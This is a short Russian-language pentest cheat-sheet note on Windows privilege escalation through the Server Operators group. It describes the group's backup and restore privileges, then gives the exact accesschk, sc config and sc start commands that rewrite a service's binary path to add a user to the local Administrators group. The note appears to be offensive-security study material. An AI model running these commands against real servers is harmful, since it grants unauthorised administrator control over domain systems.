#group #AD #windows #privillage #lpe

> Группа «Операторы серверов» позволяет своим членам администрировать серверы Windows без необходимости назначения прав администратора домена. 

Это группа с очень высокими привилегиями, которая может локально входить в систему на серверах, включая контроллеры домена.

Этой группе присущи привелеги:
- `SeBackupPrivilege` 
- `SeRestorePrivilege`


# Атака через **Service Binary Path Manipulation** (манипуляция путем к исполняемому файлу службы)

> Для успешной атаки у нас должны быть все права на группу Server Operators на любой исполняемый сервис

```powershell
accesschk.exe -uwcqv "Users" <Name_Service/AppReadiness>
```

Далее подсовываем путь к исполняемому файлу команду для добавления нас в группу локальных администраторов
```powershell
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

Триггерим службу
```powershell
sc start AppReadiness
```

Проверяем группу
```powershell
net localgroup Administrators
```
